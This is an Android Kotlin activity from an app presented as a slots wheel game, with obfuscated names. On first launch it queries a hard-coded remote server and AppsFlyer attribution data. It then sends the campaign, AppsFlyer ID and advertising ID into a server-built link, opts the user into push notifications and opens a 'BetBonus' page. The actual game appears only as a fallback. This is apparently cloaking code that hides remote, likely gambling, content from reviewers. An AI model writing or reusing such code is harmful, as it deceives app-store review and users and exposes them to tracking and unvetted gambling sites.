package game.wheelsuper.wheelslots

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.viewModels
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.mutableStateOf
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import com.appsflyer.AppsFlyerLib
import com.onesignal.OneSignal
import game.wheelsuper.wheelslots.domain.BetBonus
import game.wheelsuper.wheelslots.domain.MyViewModel
import game.wheelsuper.wheelslots.domain.ijfokJIFIHWQjfiqwfj
import game.wheelsuper.wheelslots.ui.theme.WheelSlotsTheme
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request

class ONjfoqiwjJIFJIWQifjiqfi : ComponentActivity() {
    private val viewModel: MyViewModel by viewModels()
    private lateinit var sharedPreferences: SharedPreferences
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val wqijrqjiwr8ujirubawirj = WindowCompat.getInsetsController(window, window.decorView)
        wqijrqjiwr8ujirubawirj.systemBarsBehavior =
            WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        wqijrqjiwr8ujirubawirj.hide(WindowInsetsCompat.Type.systemBars())

        val scope = CoroutineScope(Dispatchers.IO)
        val ijwqjirjoqwirijqwjfjo = mutableStateOf(false)
        sharedPreferences = getSharedPreferences("WHEEEL", Context.MODE_PRIVATE)

        val decodedString = "https://lstasisal.online/p6twp7"
        val appsFlyerUid = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
            val client = OkHttpClient()
            val request = Request.Builder().url(decodedString).build()
            scope.launch {
                Log.d("fkqwjrio",isFirstLaunch().toString())
                try {
                    if (isFirstLaunch()) {
                        val response = client.newCall(request).execute()
                        val responseCode = response.code
                        if (!sharedPreferences.contains("code")) {
                            sharedPreferences.edit().putInt(
                                "code",
                                responseCode
                            ).apply()
                        }
                        Log.d("fkqwjrio",responseCode.toString())
                        Log.d("fkqwjrio",sharedPreferences.getString("siteUrl","").toString())
                        withContext(Dispatchers.Main) {
                            viewModel.initializeAppsFlyer(this@ONjfoqiwjJIFJIWQifjiqfi) { conversionData ->
                                Log.d("fkqwjrio", "fetchAppsFlyerData")

                                Log.d("fkqwjrio2", "conversionData = $conversionData")
                                if (conversionData != null && conversionData["af_status"].toString()
                                        .contains("No")
                                ) {
                                    handleConversionData(
                                        conversionData,
                                        appsFlyerUid.toString(),
                                        response.body?.string().toString()
                                    )



                                    Log.d("fkqwjrio", "handleConversionData")
                                } else {
                                    if (sharedPreferences.getString("siteUrl", "")
                                            .isNullOrEmpty()
                                        && responseCode == 200
                                    ) {
                                        sharedPreferences.edit().putString(
                                            "siteUrl",
                                            response.body?.string().toString()
                                        ).apply()
                                    }
                                    Log.d("fkqwjrio", "navigateToSiteUrl1")
                                    navigateToSiteUrl(ijwqjirjoqwirijqwjfjo, responseCode)
                                }

                                Log.d("fkqwjrio", "waiting for conversionDataFailLiveData...")

                            }

                            Log.d("fkqwjrio", "markFirstLaunch")
                            markFirstLaunch()
                        }
                    } else {
                        navigateToSiteUrl(ijwqjirjoqwirijqwjfjo,sharedPreferences.getInt("code",404))
                        Log.d("fkqwjrio","navigateToSiteUrl3")
                    }
                }
                catch (e:Exception){
                    ijwqjirjoqwirijqwjfjo.value = true
                }

            }


        setContent {
            WheelSlotsTheme {

                AnimatedVisibility(visible = !ijwqjirjoqwirijqwjfjo.value) {
                    ijfokJIFIHWQjfiqwfj {

                    }
                }
                AnimatedVisibility(visible = ijwqjirjoqwirijqwjfjo.value) {
                    MNfbixZJIICu9u9ji2i()
                }


            }
        }
    }
    private fun isFirstLaunch(): Boolean {
        val preferences = getPreferences(Context.MODE_PRIVATE)
        return preferences.getBoolean("isFirstLaunch", true)
    }

    private fun markFirstLaunch() {
        val editor = getPreferences(Context.MODE_PRIVATE).edit()
        editor.putBoolean("isFirstLaunch", false)
        editor.apply()
    }
    private fun handleConversionData(
        data: Map<String, Any>,
        appsFlyerUid: String,
        someValue: String
    ) {
        val eventData = mapOf(
            "c" to data["campaign"].toString(),
            "afID" to appsFlyerUid,
            "ad" to viewModel.advertisingId
        )
        Log.d("fkqwjrio","handleConversionData")
        OneSignal.login(viewModel.advertisingId)
        OneSignal.User.pushSubscription.optIn()
        val newLink = viewModel.buildFinalLink(someValue, viewModel.someValue, eventData)
        Log.d("fkqwjrio",newLink)
        val tripEgypt = Intent(this@ONjfoqiwjJIFJIWQifjiqfi, BetBonus::class.java)
        tripEgypt.putExtra("url",newLink)
        sharedPreferences.edit().putString("url",newLink).apply()
        startActivity(tripEgypt)
        finish()

    }

    private fun navigateToSiteUrl(canWeGo: MutableState<Boolean>, responseCode:Int) {


        if (sharedPreferences.contains("siteUrl") ||responseCode == 200 ) {
            val link =  sharedPreferences.getString("siteUrl", null)
            Log.d("fkqwjrio",link.toString())
            val tripEgypt = Intent(this@ONjfoqiwjJIFJIWQifjiqfi,BetBonus::class.java)
            tripEgypt.putExtra("url",link)
            sharedPreferences.edit().putString("url",link).apply()
            startActivity(tripEgypt)
            finish()
        } else {
            Log.d("fkqwjrio","canWeGo.value = true")
            canWeGo.value = true
        }
    }
}
